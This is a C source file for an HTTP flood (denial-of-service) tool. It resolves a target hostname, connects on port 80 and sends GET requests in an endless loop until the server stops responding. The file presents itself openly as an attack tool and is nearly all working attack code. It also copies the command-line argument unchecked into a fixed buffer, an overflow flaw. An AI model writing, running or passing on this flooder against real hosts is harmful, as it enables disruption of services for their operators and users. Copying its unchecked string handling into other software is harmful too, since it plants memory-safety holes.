#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//#include <mpi.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <arpa/inet.h>

const char *getIp(const char *hostname, char *restrict ip)
{
	struct in_addr **addr_list;
	struct hostent *host;
	int i;

	if ((host = gethostbyname(hostname)) == NULL) //return information about host
	{
		herror("gethostbyname");
		exit(0);
	}

	addr_list = (struct in_addr **)host->h_addr_list; //create address list from host info

	for (i = 0; addr_list[i] != NULL; i++)
	{
		strcpy(ip, inet_ntoa(*addr_list[i])); //choose ip from address list
	}

	printf("IP address: %s\n", ip);

	return ip;
}

int httpFlood(const char *ip, int port)
{

	int socket_desc;
	struct sockaddr_in server;
	char *message;

	socket_desc = socket(AF_INET, SOCK_STREAM, 0); //create socket
	if (socket_desc == -1)						   //above function returns -1 on socket error
	{
		printf("Could not create socket\n");
	}

	server.sin_addr.s_addr = inet_addr(ip); //setting ip address in struct
	server.sin_family = AF_INET;			//setting connection type in struct
	server.sin_port = htons(port);			//setting port number in struct

	if (connect(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0) //connect to ip address
	{
		printf("Could not connect\n");
		return 1;
	}

	printf("Connected\n");

	message = "GET / HTTP/1.1\r\n\r\n"; //HTTP GET message to get home page

	int true = 0;
	printf("Flooding\n");

	while (true == 0) //	infinite flood loop
	{
		if (send(socket_desc, message, strlen(message), 0) < 0) //break loop once connection is broken, aka. sever down
		{
			printf("Server down\n");
			return 1;
		}
	}
}

int main(int argc, char *argv[])
{
	char hostname[256];
	char ip[100];
	int port;

	if (argc == 2)
	{
		strcpy(hostname, argv[1]); //host name from command line
		port = 80;				   //atoi(argv[2]);  //port number can be retrieved from command line, for now it is default port 80
	}
	else
	{
		printf("Usage: ./filename {hostName}\n"); //incorrect number of arguments print out
		exit(0);
	}

	getIp(hostname, ip); //get ip address from host name

	httpFlood(ip, port); //flood ip address with HTTP GET requests

	return 0;
}